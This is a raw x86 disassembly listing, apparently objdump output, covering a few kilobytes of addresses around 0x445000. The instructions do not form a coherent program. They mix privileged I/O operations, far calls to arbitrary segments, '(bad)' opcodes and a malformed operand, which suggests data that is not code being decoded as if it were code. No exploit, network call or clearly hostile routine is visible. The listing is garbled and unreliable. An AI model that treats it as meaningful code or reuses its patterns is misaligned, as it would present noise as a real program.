  44509a:	ins    BYTE PTR es:[edi],dx
  44509b:	sahf   
  44509c:	xchg   ebp,eax
  44509d:	fild   DWORD PTR [esi-0x5c]
  4450a0:	ror    BYTE PTR [edx*4+0x5a750a6e],0xf9
  4450a8:	fistp  QWORD PTR [ebx-0x1dd39c66]
  4450ae:	ins    DWORD PTR es:[edi],dx
  4450af:	scas   eax,DWORD PTR es:[edi]
  4450b0:	xor    ecx,esi
  4450b2:	ds mov bl,0xf7
  4450b5:	ds fwait
  4450b7:	or     BYTE PTR [ebp+0x1e82fa62],dh
  4450bd:	imul   edi,DWORD PTR ds:0x90438a18,0x6d
  4450c4:	or     BYTE PTR [ecx],cl
  4450c6:	int3   
  4450c7:	xor    DWORD PTR [edx+0x68d0732f],esi
  4450cd:	xchg   esp,eax
  4450ce:	mov    ah,0xa7
  4450d0:	add    BYTE PTR [edx],ah
  4450d2:	or     eax,0x7a71bf8b
  4450d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4450d8:	call   0x9301:0xb374ccf2
  4450df:	int    0xc1
  4450e1:	into   
  4450e2:	rcl    BYTE PTR [ebx],cl
  4450e4:	jb     0x44515d
  4450e6:	inc    esi
  4450e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4450e8:	sbb    DWORD PTR [esi],esp
  4450ea:	add    al,0xc6
  4450ec:	xor    eax,0x2d3f6ada
  4450f1:	imul   ebp,ebx,0xdc6b219
  4450f7:	add    ah,cl
  4450f9:	imul   ebp,DWORD PTR [esi+0x3b],0x3d
  4450fd:	or     edx,DWORD PTR [edi]
  4450ff:	xor    ah,BYTE PTR [ebx-0x37]
  445102:	loope  0x4450f7
  445104:	ins    DWORD PTR es:[edi],dx
  445105:	add    DWORD PTR [ebp+0x5afcb5ce],0x35
  44510c:	cmp    BYTE PTR [edx],0x25
  44510f:	or     bh,bh
  445111:	je     0x445108
  445113:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445114:	xchg   edi,eax
  445115:	pop    ecx
  445116:	add    ebp,DWORD PTR [ebp-0x1f6afd1]
  44511c:	mov    bh,0xd1
  44511e:	jg     0x44519b
  445120:	fdivr  DWORD PTR [edi-0x66]
  445123:	pop    eax
  445124:	xchg   edx,eax
  445125:	inc    ebx
  445126:	enter  0x3e19,0xa
  44512a:	jmp    0x44519e
  44512c:	int    0x4e
  44512e:	fiadd  DWORD PTR [edx+0x20]
  445131:	ret    
  445132:	push   0x4
  445134:	mov    dl,0x9a
  445136:	inc    edi
  445137:	out    dx,eax
  445138:	and    cl,BYTE PTR [ecx+0xb4b4dba]
  44513e:	aas    
  44513f:	jnp    0x445174
  445141:	cwde   
  445142:	jnp    0x4450d9
  445144:	cwde   
  445145:	xor    ebx,DWORD PTR [edx+0x552ca21f]
  44514b:	mov    al,BYTE PTR [eax]
  44514d:	outs   dx,DWORD PTR ds:[esi]
  44514e:	jp     0x44510a
  445150:	and    dl,bh
  445152:	ds xchg edi,eax
  445154:	inc    edx
  445155:	push   0x60afb400
  44515a:	(bad)  
  44515b:	lods   al,BYTE PTR ds:[esi]
  44515c:	jne    0x445105
  44515e:	jo     0x4450f4
  445160:	bound  esp,QWORD PTR [eax]
  445162:	xchg   edi,eax
  445163:	push   es
  445164:	add    eax,0xb86aa60b
  445169:	sub    ecx,DWORD PTR [ebx+0x25]
  44516c:	cmp    esi,DWORD PTR [eax]
  44516e:	call   0xf1b:0xa3a30128
  445175:	fistp  WORD PTR [esi]
  445177:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445178:	sahf   
  445179:	adc    eax,0xff7f0aef
  44517e:	loop   0x44514c
  445180:	mov    dl,0x40
  445182:	das    
  445183:	mov    esp,0x1f90f16f
  445188:	addr16 or bl,bl
  44518b:	sbb    bh,BYTE PTR [ebp+0x32e71af5]
  445191:	int3   
  445192:	jns    0x44520b
  445194:	enter  0x99e9,0x7d
  445198:	sar    esp,cl
  44519a:	inc    BYTE PTR [esi+0x6c]
  44519d:	fwait
  44519e:	aaa    
  44519f:	add    al,0x90
  4451a1:	jg     0x4451a2
  4451a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4451a4:	and    BYTE PTR [ebp-0x29],ah
  4451a7:	fimul  WORD PTR [ebp-0x4d413de8]
  4451ad:	ret    
  4451ae:	bound  esi,QWORD PTR [ebp+0x7d1ad352]
  4451b4:	add    ecx,DWORD PTR [ebx]
  4451b6:	xor    edx,DWORD PTR [edi+ebp*4-0x6cea6f02]
  4451bd:	mov    eax,0x6b02b19a
  4451c2:	mov    al,0xb0
  4451c4:	enter  0xa85,0xa3
  4451c8:	pop    edi
  4451c9:	cmp    al,0x1c
  4451cb:	ret    
  4451cc:	mov    esi,0x4818d8b
  4451d1:	push   cs
  4451d2:	call   0x76ec:0xfdb0267f
  4451d9:	dec    BYTE PTR [edi-0x58]
  4451dc:	xor    al,0xad
  4451de:	dec    eax
  4451df:	jae    0x4451f5
  4451e1:	jbe    0x44524b
  4451e3:	xchg   ebx,eax
  4451e4:	mov    dl,0x7f
  4451e6:	mov    dh,0x9
  4451e8:	das    
  4451e9:	shl    BYTE PTR ds:0x3b3161b0,0xc5
  4451f0:	mov    ecx,DWORD PTR es:[esi+0x38]
  4451f4:	mov    dl,0x9
  4451f6:	nop
  4451f7:	cdq    
  4451f8:	mov    eax,ds:0xb2e487ee
  4451fd:	mov    al,0xa9
  4451ff:	shl    DWORD PTR [edi],1
  445201:	jl     0x445218
  445203:	xchg   dh,bh
  445205:	or     ebx,DWORD PTR [ecx-0x2d106ac]
  44520b:	cmp    al,0x5a
  44520d:	pop    ecx
  44520e:	jmp    0x30100f8e
  445213:	aas    
  445214:	inc    esi
  445215:	push   ss
  445216:	call   0xf931:0xf0215397
  44521d:	jp     0x4451fe
  44521f:	test   al,0x99
  445221:	jl     0x445205
  445223:	pop    esi
  445224:	sub    dl,BYTE PTR [ecx]
  445226:	mov    ds:0x95190207,al
  44522b:	xchg   ecx,eax
  44522c:	xor    DWORD PTR [eax],esi
  44522e:	nop
  44522f:	xchg   DWORD PTR [esi+0x1ddc5583],eax
  445235:	or     edx,DWORD PTR [edi]
  445237:	loop   0x4451e7
  445239:	sti    
  44523a:	xor    ah,BYTE PTR [edx-0xe1095a4]
  445240:	mov    esp,0xc2670015
  445245:	sub    eax,DWORD PTR [eax-0x2511808d]
  44524b:	sahf   
  44524c:	repz add bl,BYTE PTR [edx-0x3b4546f9]
  445253:	xor    esi,DWORD PTR [ebp+0x4b639ad3]
  445259:	(bad)  
  44525a:	mov    ah,0x6a
  44525c:	ds in  eax,dx
  44525e:	ja     0x445207
  445260:	pop    ecx
  445261:	hlt    
  445262:	mov    cl,0xd1
  445264:	fyl2xp1 
  445266:	pop    eax
  445267:	xor    BYTE PTR [edx+0x4a5c0071],dh
  44526d:	push   edi
  44526e:	aam    0x22
  445270:	pushf  
  445271:	add    BYTE PTR [edx+ebx*4+0x58],ah
  445275:	or     bl,BYTE PTR [edx]
  445277:	fistp  WORD PTR [esi]
  445279:	ret    0x38ab
  44527c:	loop   0x44521d
  44527e:	push   0xffffffb3
  445280:	mov    dl,0x91
  445282:	pusha  
  445283:	sub    cl,0xaf
  445286:	int3   
  445287:	das    
  445288:	out    0xe9,al
  44528a:	xchg   DWORD PTR [eax-0x6ede5a67],ebp
  445290:	repnz or eax,0x44eb5576
  445296:	xchg   ebp,ebx
  445298:	adc    BYTE PTR [ecx],cl
  44529a:	pop    edx
  44529b:	push   0xebf8e1aa
  4452a0:	lock jnp 0x4452f7
  4452a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4452a4:	data16 mov al,al
  4452a7:	pop    eax
  4452a8:	mov    ebp,0xb5ce9ba1
  4452ad:	add    DWORD PTR [ecx-0x6],0x1d
  4452b1:	leave  
  4452b2:	or     edi,DWORD PTR [edx-0x51]
  4452b5:	push   0xfffffffa
  4452b7:	and    eax,0x401f0b89
  4452bc:	pushf  
  4452bd:	je     0x4452a0
  4452bf:	ss inc edx
  4452c1:	push   edi
  4452c2:	call   0xaf13:0xeecad2ee
  4452c9:	sub    eax,0x6a029f4b
  4452ce:	call   0x41e9:0xce649650
  4452d5:	cdq    
  4452d6:	call   0xe7fd:0x875022e5
  4452dd:	add    eax,0xd668a703
  4452e2:	popa   
  4452e3:	retf   0xf799
  4452e6:	jno    0x4452d8
  4452e8:	jb     0x445361
  4452ea:	sub    ebx,DWORD PTR [ecx+0x4ff15380]
  4452f0:	mov    ebp,0x4a51a304
  4452f5:	xchg   ebx,eax
  4452f6:	cmp    bh,BYTE PTR [esi]
  4452f8:	jbe    0x445360
  4452fa:	or     BYTE PTR [ecx-0x43],dh
  4452fd:	ja     0x4452b4
  4452ff:	add    ecx,eax
  445301:	ins    BYTE PTR es:[edi],dx
  445302:	pop    ecx
  445303:	mov    cl,0x32
  445305:	jmp    0x5d95:0x9f95d9
  44530c:	jle    0x44534e
  44530e:	call   0xfd37:0x5ba9b75a
  445315:	out    dx,al
  445316:	jp     0x445396
  445318:	mov    esp,0x7d603b0b
  44531d:	sbb    BYTE PTR [edi+0x2a],ah
  445320:	xchg   esp,eax
  445321:	adc    al,0x9a
  445323:	push   esi
  445324:	mov    eax,0x28a5c044
  445329:	jb     0x4453a8
  44532b:	test   al,0x6f
  44532d:	add    esi,DWORD PTR [ebx+0x62]
  445330:	xlat   BYTE PTR ds:[ebx]
  445331:	sbb    al,0xce
  445333:	daa    
  445334:	mov    al,ds:0xb2f4172f
  445339:	int    0x55
  44533b:	aaa    
  44533c:	fisubr WORD PTR [eax]
  44533e:	fst    DWORD PTR [esi+0x50]
  445341:	or     edx,eax
  445343:	jb     0x44539f
  445345:	jg     0x445318
  445347:	jnp    0x445316
  445349:	(bad)  
  44534a:	xchg   esp,eax
  44534b:	mov    ss,WORD PTR [ebx-0x73]
  44534e:	out    0x10,eax
  445350:	scas   eax,DWORD PTR es:[edi]
  445351:	adc    eax,0x9be0fa84
  445356:	call   0x4ed:0x7086f21f
  44535d:	or     edx,DWORD PTR [edi-0x519a3f3a]
  445363:	push   ebx
  445364:	push   esi
  445365:	or     al,0x9d
  445367:	hlt    
  445368:	pop    es
  445369:	xchg   edx,eax
  44536a:	lahf   
  44536b:	cmp    eax,0x42ca1305
  445370:	push   ebp
  445371:	push   ebp
  445372:	sub    ah,BYTE PTR [edi-0x2b35889f]
  445378:	cdq    
  445379:	mov    ?,WORD PTR ds:0x9a874ae6
  44537f:	stos   BYTE PTR es:[edi],al
  445380:	lods   eax,DWORD PTR ds:[esi]
  445381:	inc    ebp
  445382:	inc    eax
  445383:	xchg   ebp,eax
  445384:	gs inc ebx
  445386:	xor    ah,BYTE PTR [edi+0x119d7fdf]
  44538c:	dec    ecx
  44538d:	xor    eax,0xadb20301
  445392:	int3   
  445393:	xchg   edi,eax
  445394:	repnz pop esi
  445396:	pop    esp
  445397:	aad    0x71
  445399:	or     ecx,DWORD PTR [edx-0x765a1d16]
  44539f:	sbb    eax,0x59a71e48
  4453a4:	mov    sp,WORD PTR [edi-0x2ccdea86]
  4453ab:	mov    bh,BYTE PTR [ebx]
  4453ad:	add    eax,0xdd2d0691
  4453b2:	call   0xb26d:0x77ca8d17
  4453b9:	lea    ecx,[ecx+0x6edefcc1]
  4453bf:	mov    al,0x7f
  4453c1:	or     ecx,DWORD PTR [esi]
  4453c3:	cdq    
  4453c4:	dec    eax
  4453c5:	retf   
  4453c6:	mov    eax,ds:0xa5fa4058
  4453cb:	mov    bl,0x12
  4453cd:	or     edi,DWORD PTR ds:0x69ee07cd
  4453d3:	les    ebx,FWORD PTR [eax-0x3a43ddf4]
  4453d9:	(bad)  
  4453db:	xchg   DWORD PTR [eax-0x4db6026a],ebp
  4453e1:	jnp    0x445413
  4453e3:	adc    eax,0xb573fae3
  4453e8:	out    0x4,eax
  4453ea:	push   ebx
  4453eb:	(bad)  
  4453ed:	mov    DWORD PTR [edx],ebx
  4453ef:	(bad)  
  4453f0:	in     eax,dx
  4453f1:	cmp    DWORD PTR [edx+edx*1-0x13b4324e],ebp
  4453f8:	test   al,0x2d
  4453fa:	int3   
  4453fb:	repz mov ebp,0x7d7cf50b
  445401:	jp     0x44538f
  445403:	push   sp
  445405:	adc    ebx,DWORD PTR [edx-0x28e62c28]
  44540b:	shl    DWORD PTR [esi-0x145ce139],cl
  445411:	fsub   DWORD PTR [esi+esi*4]
  445414:	cmp    bl,cl
  445416:	stc    
  445417:	inc    edx
  445418:	aad    0x1
  44541a:	call   0xdd30:0x7040b412
  445421:	mov    WORD PTR [ebp+0x329ba6a7],fs
  445427:	scas   al,BYTE PTR es:[edi]
  445428:	leave  
  445429:	xchg   dl,bl
  44542b:	loop   0x4453df
  44542d:	(bad)  
  44542e:	sbb    al,0xc2
  445430:	stos   DWORD PTR es:[edi],eax
  445431:	(bad)  
  445432:	adc    edi,esi
  445434:	dec    eax
  445435:	add    al,0xb2
  445437:	mov    edi,DWORD PTR [edx+0x73]
  44543a:	sbb    ch,BYTE PTR [ebp-0x2a3e7365]
  445440:	mov    bl,0xdf
  445442:	(bad)  
  445444:	dec    ecx
  445445:	pop    esp
  445446:	xchg   edi,eax
  445447:	xchg   ebp,eax
  445448:	pop    esi
  445449:	js     0x44549b
  44544b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44544c:	lds    ebx,FWORD PTR [esi]
  44544e:	ret    
  44544f:	mov    ch,0x6b
  445451:	loope  0x44546c
  445453:	in     eax,dx
  445454:	(bad)
  445457:	fdivr  DWORD PTR [ecx]
  445459:	xor    al,ch
  44545b:	lds    ebp,FWORD PTR [eax+0x1da7c047]
  445461:	xor    ebp,edi
  445463:	cld    
  445464:	into   
  445465:	fwait
  445466:	sbb    esp,0xffffffb2
  445469:	sub    bh,cl
  44546b:	sti    
  44546c:	call   0xedf7:0x13f4ab83
  445473:	inc    DWORD PTR [ebp+0x71]
  445476:	mov    BYTE PTR [edi+ebp*2],cl
  445479:	add    al,0x63
  44547b:	xchg   ebp,eax
  44547c:	rcr    BYTE PTR [ecx],cl
  44547e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44547f:	loopne 0x4454af
  445481:	inc    esi
  445482:	call   0x4b64:0x836b64a1
  445489:	sbb    BYTE PTR [edx+0x7d5bcfa7],dl
  44548f:	xor    DWORD PTR [esi+0x70],ebx
  445492:	mov    eax,ds:0xb3e0b379
  445497:	sbb    ebx,DWORD PTR [eax+0xe]
  44549a:	mov    edx,0xf9fb4537
  44549f:	mov    WORD PTR [eax+0xb],ss
  4454a2:	add    DWORD PTR [edx+0xf],0xffffffa7
  4454a6:	mov    ds:0x9abebfc0,al
  4454ab:	mov    edx,0x343086d8
  4454b0:	loopne 0x44548b
  4454b2:	mov    ecx,0x7f1feba7
  4454b7:	sbb    dh,bh
  4454b9:	jbe    0x445464
  4454bb:	fdiv   QWORD PTR [edx+0x19c54008]
  4454c1:	mov    DWORD PTR [ecx-0x76],esp
  4454c4:	mov    ds:0x8fa89f53,al
  4454c9:	out    0x99,eax
  4454cb:	mov    eax,ds:0xa9b125cf
  4454d0:	add    bh,BYTE PTR ds:0x52bb5267
  4454d6:	fist   WORD PTR [edi+ebp*1]
  4454d9:	cld    
  4454da:	sbb    eax,0x3c6b08ac
  4454df:	test   DWORD PTR [ecx],esp
  4454e1:	ficomp WORD PTR [esi+0x492b29b4]
  4454e7:	push   cs
  4454e8:	xor    dh,BYTE PTR [esi-0xb0eab47]
  4454ee:	stos   BYTE PTR es:[edi],al
  4454ef:	call   0xec986c73
  4454f4:	xor    ecx,DWORD PTR [ebx]
  4454f6:	push   0xffffffeb
  4454f8:	(bad)  
  4454f9:	popf   
  4454fa:	mov    ds:0xc9acb204,al
  4454ff:	xchg   esp,eax
  445500:	sbb    ah,BYTE PTR [ebp-0x6b444c]
  445506:	fwait
  445507:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445508:	dec    ecx
  445509:	int    0xd9
  44550b:	mov    ds:0xbe72e46b,al
  445510:	mov    ebx,0x85d9a1b
  445515:	cwde   
  445516:	cmp    ch,BYTE PTR [edx+0x18]
  445519:	lock jnp 0x4454c3
  44551c:	sbb    eax,0xf13b1dd3
  445521:	sub    ch,bl
  445523:	cmp    eax,0x639501b2
  445528:	pop    ss
  445529:	jg     0x44553d
  44552b:	xchg   edx,eax
  44552c:	mov    fs,esi
  44552e:	mov    edx,0x74e5ee09
  445533:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445534:	adc    DWORD PTR ds:0x364a5ab2,esp
  44553a:	fadd   DWORD PTR [ebp+0x2a]
  44553d:	push   esi
  44553e:	call   0xf1d9:0xfda9f5f3
  445545:	push   edi
  445546:	scas   al,BYTE PTR es:[edi]
  445547:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445548:	(bad)  
  445549:	mov    esp,0xd912cc30
  44554e:	jmp    0xdafb0b99
  445553:	ret    0xdb94
  445556:	pop    edx
  445557:	inc    esi
  445558:	lea    esi,[ecx-0x5c]
  44555b:	mov    DWORD PTR [ecx-0x3658e745],eax
  445561:	adc    eax,0x6b7e4a61
  445566:	call   0x6650:0x960ec67a
  44556d:	and    bh,BYTE PTR [esi+0x6d946d8b]
  445573:	test   al,0x79
  445575:	stc    
  445576:	jp     0x445584
  445578:	pusha  
  445579:	pushf  
  44557a:	in     eax,0x8c
  44557c:	enter  0xec5c,0xdf
  445580:	mov    dl,0xb0
  445582:	rcr    DWORD PTR [edx+0x113998a9],cl
  445588:	test   ebp,edi
  44558a:	fbld   TBYTE PTR [edi+0x658a5b47]
  445590:	dec    edi
  445591:	jae    0x445611
  445593:	scas   al,BYTE PTR es:[edi]
  445594:	mov    cl,0xa4
  445596:	and    eax,0x4779676c
  44559b:	push   ds
  44559c:	pushf  
  44559d:	and    al,0xfa
  44559f:	lods   al,BYTE PTR ds:[esi]
  4455a0:	(bad)  
  4455a1:	sbb    ecx,ebp
  4455a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4455a4:	sbb    ecx,DWORD PTR [ecx+ecx*2]
  4455a7:	call   0xc082e0e7
  4455ac:	xchg   ebx,eax
  4455ad:	loope  0x445549
  4455af:	mov    al,0xb8
  4455b1:	add    DWORD PTR gs:[edi],esp
  4455b4:	add    DWORD PTR [ebx+ecx*4+0x5b],esi
  4455b8:	pop    ds
  4455b9:	or     eax,DWORD PTR [ebx-0x224ffdd5]
  4455bf:	pushf  
  4455c0:	std    
  4455c1:	push   ebp
  4455c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4455c3:	pop    edx
  4455c4:	test   al,0x8b
  4455c6:	inc    esi
  4455c7:	outs   dx,DWORD PTR ds:[esi]
  4455c8:	imul   ecx,DWORD PTR [ebx-0x6f],0xffffffe2
  4455cc:	loopne 0x4455d9
  4455ce:	push   ebx
  4455cf:	jge    0x44557a
  4455d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4455d2:	inc    esp
  4455d3:	imul   ebp,DWORD PTR [eax],0xce5b9de0
  4455d9:	scas   al,BYTE PTR es:[edi]
  4455da:	lock bound edi,QWORD PTR ss:[ecx+eiz*8-0x1d]
  4455e0:	jbe    0x4455ea
  4455e2:	mov    ebx,0x5d8e9bd3
  4455e7:	mov    esi,0x83af3132
  4455ec:	mov    dl,0x40
  4455ee:	fadd   st(7),st
  4455f0:	push   ecx
  4455f1:	in     eax,dx
  4455f2:	sub    dh,BYTE PTR ds:0xb0e8088b
  4455f8:	aaa    
  4455f9:	mov    ah,0xbd
  4455fb:	pop    ebp
  4455fc:	xor    ch,BYTE PTR [edi]
  4455fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4455ff:	lods   al,BYTE PTR ds:[esi]
  445600:	mov    dl,0xeb
  445602:	dec    ebp
  445603:	addr16 mov bh,0x7a
  445606:	mov    edi,0xf50b1e75
  44560b:	shr    ah,cl
  44560d:	arpl   bx,si
  44560f:	or     ah,ch
  445611:	xor    eax,0xf0b24be6
  445616:	pop    es
  445617:	(bad)  
  445618:	fwait
  445619:	mov    ah,0x2a
  44561b:	enter  0xbb0,0x2c
  44561f:	pop    ebx
  445620:	xchg   esp,eax
  445621:	cdq    
  445622:	nop
  445623:	ret    
  445624:	ror    DWORD PTR [edi-0x154d33f6],cl
  44562a:	push   0xb6fcbdde
  44562f:	push   ss
  445630:	pop    ebp
  445631:	or     al,0xe5
  445633:	or     dl,BYTE PTR [ebp-0x4928ebf7]
  445639:	dec    ebx
  44563a:	clc    
  44563b:	dec    edi
  44563c:	mov    dl,0x33
  44563e:	dec    ebx
  44563f:	inc    ecx
  445640:	lods   al,BYTE PTR ds:[esi]
  445641:	sub    edx,DWORD PTR [ebp+ecx*8-0x1b]
  445645:	or     esp,DWORD PTR [ebx]
  445647:	clc    
  445648:	fidivr WORD PTR [edx]
  44564a:	arpl   WORD PTR [ebx-0x52],sp
  44564d:	pop    ebx
  44564e:	jmp    0xe781:0x459db250
  445655:	(bad)  
  445657:	into   
  445658:	pop    ecx
  445659:	or     ebp,edi
  44565b:	or     BYTE PTR [ecx+0x3a],al
  44565e:	adc    BYTE PTR [edi-0x50],ah
  445661:	shl    DWORD PTR [ebx+0x2f8b28ef],1
  445667:	inc    eax
  445668:	ds inc ebp
  44566a:	fcmovnu st,st(4)
  44566c:	daa    
  44566d:	or     edx,esi
  44566f:	fisttp WORD PTR [eax+0x3e]
  445672:	bound  edi,QWORD PTR [eax]
  445674:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  445675:	mov    ecx,0x79c596ea
  44567a:	call   0xa9b3:0x37bc84e3
  445681:	jecxz  0x44564a
  445683:	aad    0xd5
  445685:	or     al,0x9
  445687:	repnz sbb eax,0xbe8706a2
  44568d:	mov    ch,0x7c
  44568f:	mov    BYTE PTR [edx+0x9590703],dh
  445695:	sar    esi,1
  445697:	ins    DWORD PTR es:[edi],dx
  445698:	mov    cl,BYTE PTR [ebx]
  44569a:	daa    
  44569b:	aad    0x64
  44569d:	mov    ebx,0x9c4d44b
  4456a2:	call   0x7b6b:0x632494ac
  4456a9:	pop    edi
  4456aa:	jg     0x445653
  4456ac:	push   cs
  4456ad:	jno    0x4456fb
  4456af:	add    eax,0x446c928c
  4456b4:	mov    dl,0x6e
  4456b6:	outs   dx,BYTE PTR ds:[esi]
  4456b7:	aas    
  4456b8:	shl    DWORD PTR [ecx+0xb9acc07],1
  4456be:	imul   esp,DWORD PTR [esi],0x77
  4456c1:	add    al,0xcf
  4456c3:	xchg   edx,eax
  4456c4:	pushf  
  4456c5:	or     ecx,ebp
  4456c7:	retf   0xdac2
  4456ca:	call   0x7070:0x17e93c28
  4456d1:	mov    edx,ss
  4456d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4456d4:	js     0x4456e3
  4456d6:	sbb    esi,DWORD PTR [edx+0x2f]
  4456d9:	arpl   WORD PTR [ebp+eiz*1-0x4b35354e],ax
  4456e0:	scas   eax,DWORD PTR es:[edi]
  4456e1:	xchg   bh,ch
  4456e3:	loop   0x4456b0
  4456e5:	or     ebp,DWORD PTR [edi-0x2a]
  4456e8:	cmp    DWORD PTR [edx+0x9586fd6],esp
  4456ee:	jmp    0x189d:0x1299b38a
  4456f5:	fs test eax,0x9f166a3f
  4456fb:	shl    BYTE PTR [edx],cl
  4456fd:	or     ebp,DWORD PTR [edi+0x1e]
  445700:	(bad)  
  445701:	rcr    BYTE PTR [ebx],cl
  445703:	mov    al,0x46
  445705:	int    0x99
  445707:	sahf   
  445708:	mov    ch,0x91
  44570a:	xlat   BYTE PTR ds:[ebx]
  44570b:	sti    
  44570c:	or     dl,BYTE PTR [ebx+0xb2f38e2]
  445712:	cmp    DWORD PTR [ecx-0x7a73a761],0xffffff97
  445719:	jne    0x445740
  44571b:	and    BYTE PTR [ebp+esi*8+0x7a],bl
  44571f:	xchg   esi,eax
  445720:	or     al,0x36
  445722:	xchg   ebp,eax
  445723:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445724:	retf   
  445725:	outs   dx,BYTE PTR ds:[esi]
  445726:	sbb    al,0x56
  445728:	cwde   
  445729:	shr    ch,1
  44572b:	jmp    0x4456df
  44572d:	mov    eax,0x2d079b8f
  445732:	popf   
  445733:	rcr    DWORD PTR [esi-0x446e10f5],0x46
  44573a:	push   0x9a003282
  44573f:	ficom  WORD PTR cs:[ebp+0x146c5c4d]
  445746:	jmp    DWORD PTR [edi-0x46ffbed9]
  44574c:	mov    edx,0x88c66f4a
  445751:	lods   eax,DWORD PTR ds:[esi]
  445752:	(bad)  
  445753:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445754:	pop    ss
  445755:	les    edx,FWORD PTR [eax+0x78]
  445758:	cld    
  445759:	or     eax,0x7932a414
  44575e:	sbb    al,0x91
  445760:	cs sahf 
  445762:	or     eax,0xe44f7cd7
  445767:	sub    al,0x4a
  445769:	adc    DWORD PTR [edx-0x666ebbe9],ebx
  44576f:	in     eax,dx
  445770:	jle    0x4456f4
  445772:	mov    ch,0x51
  445774:	aam    0x4
  445776:	xchg   esp,eax
  445777:	stos   BYTE PTR es:[edi],al
  445778:	in     al,0x61
  44577a:	pop    edx
  44577b:	push   0x7a
  44577d:	cmp    DWORD PTR [edi+0x4f],eax
  445780:	mov    bl,0x47
  445782:	sahf   
  445783:	imul   BYTE PTR [edi+ebx*8-0x67]
  445787:	lods   eax,DWORD PTR ds:[esi]
  445788:	dec    esi
  445789:	mov    BYTE PTR [esi+0x48cb17a4],dl
  44578f:	call   0xc5e7:0xe37268f2
  445796:	fwait
  445797:	je     0x445769
  445799:	xchg   ebx,eax
  44579a:	ja     0x445791
  44579c:	or     ebx,DWORD PTR [eax+0x53]
  44579f:	pop    ecx
  4457a0:	jbe    0x4457c1
  4457a2:	icebp  
  4457a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4457a4:	in     al,0xf8
  4457a6:	ror    esi,1
  4457a8:	cld    
  4457a9:	lods   eax,DWORD PTR ds:[esi]
  4457aa:	mov    bl,bl
  4457ac:	mov    ebx,0xfe537379
  4457b1:	mov    BYTE PTR [esi],cl
  4457b3:	dec    ebp
  4457b4:	xor    al,0x9b
  4457b6:	mov    cl,0xc3
  4457b8:	jae    0x4457ee
  4457ba:	clc    
  4457bb:	retf   0xa294
  4457be:	jo     0x445767
  4457c0:	inc    edi
  4457c1:	test   DWORD PTR ss:[eax+0x22],edi
  4457c5:	je     0x4457a7
  4457c7:	mov    ebp,0x719a0056
  4457cc:	jbe    0x44581d
  4457ce:	mov    ds:0xc2ee5967,eax
  4457d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4457d4:	dec    eax
  4457d5:	jmp    0xf01e5593
  4457da:	pop    ebx
  4457db:	popa   
  4457dc:	mov    dl,0xd8
  4457de:	test   al,0x57
  4457e0:	rol    DWORD PTR [edx-0x1a305fdd],1
  4457e6:	add    esp,DWORD PTR [edi-0x548d2392]
  4457ec:	repnz xchg esi,edi
  4457ef:	shl    BYTE PTR [edx-0x6711ef28],cl
  4457f5:	(bad)  
  4457f6:	ins    DWORD PTR es:[edi],dx
  4457f7:	lods   eax,DWORD PTR ds:[esi]
  4457f8:	imul   ecx,DWORD PTR [ebx],0xffffff82
  4457fb:	mov    dh,0xd4
  4457fd:	dec    edi
  4457fe:	pop    esp
  4457ff:	call   0x522e:0x839d6c09
  445806:	mov    dl,0xf7
  445808:	add    bh,BYTE PTR [edx-0x4a]
  44580b:	loope  0x4457fd
  44580d:	or     esp,DWORD PTR [eax+ebx*4+0x3a]
  445811:	(bad)  
  445812:	cmp    al,0x9f
  445814:	js     0x445872
  445816:	lea    ebx,[edx]
  445818:	in     eax,dx
  445819:	gs cdq 
  44581b:	in     al,0xac
  44581d:	sub    eax,0xe9d52791
  445822:	add    ah,BYTE PTR [edi+0xdb8890]
  445828:	pop    ebp
  445829:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44582a:	imul   eax,DWORD PTR [edi-0x51],0x2f
  44582e:	add    BYTE PTR [ebp-0xb],ch
  445831:	les    ecx,FWORD PTR [eax-0x17]
  445834:	and    bh,BYTE PTR [ebp-0x30]
  445837:	cdq    
  445838:	xor    eax,0xa2d7690b
  44583d:	mov    cl,0xb5
  44583f:	pop    eax
  445840:	and    bl,0x94
  445843:	push   ds
  445844:	mov    bh,0x26
  445846:	mov    eax,ds:0x4367da87
  44584b:	jmp    0x44588c
  44584d:	js     0x445893
  44584f:	mov    cl,0xec
  445851:	and    al,0x25
  445853:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445854:	icebp  
  445855:	enter  0xf8bf,0xcf
  445859:	add    eax,0x78c86b9a
  44585e:	add    DWORD PTR [ecx],esi
  445860:	and    BYTE PTR [bp+di-0x59],al
  445864:	xor    al,0x9a
  445866:	out    dx,al
  445867:	fdiv   DWORD PTR [edi-0x4a7f22ea]
  44586d:	dec    esi
  44586e:	sub    eax,0xac31ba5
  445873:	out    dx,eax
  445874:	call   0x6594:0xbaa769cf
  44587b:	add    edi,DWORD PTR [ecx]
  44587d:	sbb    al,0xe
  44587f:	fimul  WORD PTR [edx]
  445881:	add    ebx,DWORD PTR [edx-0x25e22de0]
  445887:	add    bh,BYTE PTR [eax]
  445889:	lods   eax,DWORD PTR ds:[esi]
  44588a:	jb     0x4458d5
  44588c:	mov    ah,0xb
  44588e:	lods   eax,DWORD PTR ds:[esi]
  44588f:	sub    al,0x8
  445891:	dec    ebp
  445892:	mov    edx,0x8539e1ba
  445897:	mov    ecx,0xed186f01
  44589c:	enter  0x4b24,0xc7
